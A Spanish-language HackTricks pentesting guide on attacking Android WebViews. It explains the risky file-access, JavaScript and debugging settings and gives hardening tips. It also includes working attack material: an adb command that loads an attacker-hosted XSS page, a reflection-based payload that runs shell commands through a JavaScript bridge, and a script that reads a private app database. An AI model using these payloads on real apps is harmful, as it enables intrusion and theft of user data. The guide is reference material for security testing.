# Ataques a WebView

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Configuraciones interesantes

Puedes identificar un WebView expuesto de esta manera:

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

### Acceso a archivos

El acceso a archivos de _WebView_ est√° habilitado de forma predeterminada. Desde la API 3 (Cupcake 1.5), el m√©todo [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est√° disponible para habilitarlo o deshabilitarlo expl√≠citamente.\
Si la aplicaci√≥n tiene el permiso \_**android.permission.READ\_EXTERNAL\_STORAGE** \_, podr√° leer y cargar archivos **desde el almacenamiento externo**.\
El _WebView_ necesita usar un esquema de URL de archivo, por ejemplo, `file://path/file`, para acceder al archivo.

#### Acceso universal desde URL de archivo (obsoleto)

> Establece si se deben permitir **solicitudes entre dominios** en el **contexto de una URL de esquema de archivo** para acceder a **contenido desde cualquier origen**. Esto incluye **acceso a contenido desde otras URL de esquema de archivo o contextos web**. Tenga en cuenta que algunos accesos, como los elementos HTML de imagen, no siguen las reglas de mismo origen y no se ven afectados por esta configuraci√≥n.
>
> **No** habilite esta configuraci√≥n si abre archivos que pueden ser creados o modificados por fuentes externas. Habilitar esta configuraci√≥n permite que los scripts maliciosos cargados en un contexto `file://` lancen ataques de scripting entre sitios, ya sea **accediendo a archivos locales arbitrarios**, incluidas las cookies de WebView, los datos privados de la aplicaci√≥n o incluso las credenciales utilizadas en sitios web arbitrarios.

En resumen, esto **evitar√° la carga de or√≠genes arbitrarios**. La aplicaci√≥n enviar√° la solicitud de URL para cargar el contenido con **`Origin: file://`** si la respuesta no permite ese origen (**`Access-Control-Allow-Origin: file://`**), entonces el contenido no se cargar√°.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) y versiones superiores.

* Usa [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) para saber si JavaScript que se ejecuta en el contexto de una URL de esquema de archivo puede acceder a contenido desde cualquier origen (si UniversalAccessFromFileURL est√° habilitado).
* Usa [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) para habilitar/deshabilitar esto.

{% hint style="info" %}
Usar **`loadDataWithBaseURL()`** con `null` como baseURL tambi√©n **evitar√° la carga de archivos locales**, incluso si todas las configuraciones peligrosas est√°n habilitadas.
{% endhint %}

#### Acceso a archivos desde URL de archivo (obsoleto) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> Establece si se deben permitir solicitudes entre dominios en el contexto de una URL de esquema de archivo para acceder a contenido desde otras URL de esquema de archivo. Tenga en cuenta que algunos accesos, como los elementos HTML de imagen, no siguen las reglas de mismo origen y no se ven afectados por esta configuraci√≥n.
>
> **No** habilite esta configuraci√≥n si abre archivos que pueden ser creados o modificados por fuentes externas. Habilitar esta configuraci√≥n permite que los scripts maliciosos cargados en un contexto `file://` accedan a archivos locales arbitrarios, incluidas las cookies de WebView y los datos privados de la aplicaci√≥n.

En resumen, esto evita que JavaScript acceda a archivos locales a trav√©s del protocolo `file://`.\
Ten en cuenta que **el valor de esta configuraci√≥n se ignora** si el valor de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) es `true`.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) y versiones superiores.

* Usa [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) para saber si JavaScript se est√° ejecutando en el contexto de una URL de esquema de archivo y puede acceder a contenido desde otras URL de esquema de archivo.
* Usa [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) para habilitar/deshabilitar esto.
#### Acceso a archivos

> Habilita o deshabilita el **acceso a archivos dentro de WebView**. Ten en cuenta que esto habilita o deshabilita solo el acceso al sistema de archivos. Los activos y recursos siguen siendo accesibles utilizando file:///android\_asset y file:///android\_res.

En resumen, si est√° deshabilitado, WebView no podr√° cargar un archivo local con el protocolo `file://`.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) y versiones superiores.

* Usa [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) para saber si la configuraci√≥n est√° habilitada.
* Usa [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) para habilitar/deshabilitarla.

#### WebViewAssetLoader

> Clase auxiliar para cargar archivos locales, incluidos los activos est√°ticos y recursos de la aplicaci√≥n, utilizando URL http(s):// dentro de una clase [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Cargar archivos locales utilizando URLs similares a la web en lugar de `"file://"` es deseable ya que es compatible con la pol√≠tica de mismo origen.

Esta es la nueva forma recomendada de cargar archivos locales. El objetivo es **acceder a archivos locales utilizando una URL HTTP con el dominio**. De esta manera, se puede mantener **f√°cilmente** la pol√≠tica de mismo origen entre las **p√°ginas web** locales y las **p√°ginas web** que se descargan desde el servidor web.

### JavaScript habilitado

Los WebViews tienen JavaScript **deshabilitado de forma predeterminada**. El m√©todo [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) se puede utilizar para habilitarlo o deshabilitarlo expl√≠citamente.\
Ten en cuenta que los webviews tambi√©n pueden admitir el **esquema `intent`** que permite ejecutar otras aplicaciones. Lee este [art√≠culo para saber c√≥mo pasar de XSS a RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

Aqu√≠ tienes un ejemplo de un webview expuesto vulnerable a XSS a trav√©s del par√°metro "support\_url" (que puede indicar la URL a cargar en el webview):

<figure><img src="../../.gitbook/assets/image (719).png" alt="" width="563"><figcaption></figcaption></figure>

Es posible explotar esa vulnerabilidad desde adb con algo como:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://6333-157-48-216-175.ngrok-free.app/xss.html"
```
{% endcode %}

### Puente de JavaScript

Android ofrece una forma para que el JavaScript ejecutado en un WebView llame y utilice **funciones nativas de una aplicaci√≥n de Android** (anotadas con `@JavascriptInterface`) mediante el uso del m√©todo [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). Esto se conoce como un _puente de JavaScript de WebView_ o _puente nativo_.

Ten en cuenta que **cuando utilizas `addJavascriptInterface`, est√°s otorgando expl√≠citamente acceso al objeto de la Interfaz de JavaScript registrada a todas las p√°ginas cargadas dentro de ese WebView**. Esto implica que, si el usuario navega fuera de tu aplicaci√≥n o dominio, todas las dem√°s p√°ginas externas tambi√©n tendr√°n acceso a esos objetos de la Interfaz de JavaScript, lo que podr√≠a representar un riesgo de seguridad potencial si se expone alg√∫n dato sensible a trav√©s de esas interfaces.

> Advertencia: Ten mucho cuidado con las aplicaciones dirigidas a versiones de Android anteriores a Android 4.2 (nivel de API 17), ya que son [vulnerables a una falla](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/) en la implementaci√≥n de `addJavascriptInterface`: un ataque que abusa de la reflexi√≥n, lo que lleva a la ejecuci√≥n de c√≥digo remoto cuando se inyecta JavaScript malicioso en un WebView. Esto se debi√≥ a que todos los m√©todos de objetos Java eran accesibles de forma predeterminada (en lugar de solo aquellos anotados).

#### An√°lisis est√°tico
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
// Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
// not annotated with @JavascriptInterface are not visible from JavaScript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Con acceso al c√≥digo JavaScript, por ejemplo, a trav√©s de un ataque de **XSS** almacenado, un ataque **MITM** o un **sitio web malicioso** que se carga dentro del WebView, se puede llamar directamente a los m√©todos Java expuestos.

{% hint style="info" %}
Tenga en cuenta que, en el caso de intentar explotar esta vulnerabilidad a trav√©s de una **Redirecci√≥n Abierta a una p√°gina web del atacante que accede al Objeto Nativo de Android**, si el acceso a la redirecci√≥n se realiza a trav√©s de un **navegador m√≥vil** y **no se utiliza** el mismo WebView, el **navegador no podr√° acceder al objeto nativo de Android**.
{% endhint %}

Si es necesario utilizar `addJavascriptInterface`, tenga en cuenta las siguientes consideraciones:

* Solo se debe permitir que el **JavaScript proporcionado con el APK** utilice los puentes, por ejemplo, verificando la URL en cada m√©todo Java conectado (a trav√©s de `WebView.getUrl`).
* No se debe cargar **JavaScript desde puntos finales remotos**, por ejemplo, manteniendo la navegaci√≥n de p√°ginas dentro de los dominios de la aplicaci√≥n y abriendo todos los dem√°s dominios en el navegador predeterminado (por ejemplo, Chrome, Firefox).
* Si es necesario por razones de compatibilidad (por ejemplo, tener que admitir dispositivos m√°s antiguos), **al menos establezca el nivel de API m√≠nimo en 17** en el archivo de manifiesto de la aplicaci√≥n (`<uses-sdk android:minSdkVersion="17" />`).

### Puente de JavaScript a RCE a trav√©s de Reflexi√≥n

Como se se√±ala en [**esta investigaci√≥n**](https://labs.withsecure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_consultarla para obtener ideas en caso de obtener RCE_), una vez que se encuentra un JavascriptBridge, es posible obtener **RCE** a trav√©s de **Reflexi√≥n** utilizando una carga √∫til como la siguiente:
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
Sin embargo, las aplicaciones modernas pueden usar la anotaci√≥n **`@JavascriptInterface`** que indica al JavascriptBridge que solo el m√©todo con esta anotaci√≥n debe ser expuesto. En ese escenario, no podr√°s abusar de la Reflexi√≥n para ejecutar c√≥digo arbitrario.

### Depuraci√≥n remota

La **depuraci√≥n remota de WebView** permite acceder al WebView con las **Herramientas de desarrollo de Chrome**. El dispositivo debe ser accesible desde la PC (a trav√©s de USB, emulador local, red local...) y ejecutar el WebView depurable, luego acceder a **chrome://inspect/#devices**:

![](<../../.gitbook/assets/image (525).png>)

Selecciona **inspeccionar** y se abrir√° una nueva ventana. En esta ventana, puedes **interactuar con el contenido** del WebView e incluso hacer que ejecute c√≥digo JS arbitrario desde la pesta√±a de la **consola**:

![](<../../.gitbook/assets/image (526).png>)

Para habilitar la **depuraci√≥n remota de WebView**, puedes hacer algo como:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
**Esta configuraci√≥n se aplica a todos los WebViews de la aplicaci√≥n.**

{% hint style="info" %}
**La depuraci√≥n de WebView no se ve afectada por el estado de la bandera `debuggable`** en el manifiesto de la aplicaci√≥n. Si deseas habilitar la depuraci√≥n de WebView solo cuando `debuggable` es `true`, prueba la bandera en tiempo de ejecuci√≥n.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Cargas √∫tiles

### Exfiltrar archivos arbitrarios

Las aplicaciones de Android a menudo utilizan la funcionalidad WebView para mostrar contenido web dentro de la aplicaci√≥n. Sin embargo, esta funcionalidad puede ser explotada para exfiltrar archivos arbitrarios del dispositivo.

#### T√©cnica

1. Identificar la URL de destino donde se enviar√°n los archivos exfiltrados.
2. Crear un archivo HTML malicioso que contenga un formulario para cargar archivos y enviarlos a la URL de destino.
3. Inyectar el archivo HTML malicioso en la WebView de la aplicaci√≥n objetivo.
4. Cuando el usuario interact√∫a con el formulario y carga un archivo, el archivo se enviar√° a la URL de destino especificada.
5. Verificar que los archivos se hayan exfiltrado correctamente.

#### Consideraciones

- Aseg√∫rese de que la aplicaci√≥n objetivo permita la carga de archivos a trav√©s de WebView.
- Verifique que la URL de destino sea accesible y est√© configurada correctamente para recibir los archivos exfiltrados.
- Tenga en cuenta que esta t√©cnica puede ser detectada por soluciones de seguridad que monitorean el tr√°fico de red saliente.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referencias

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
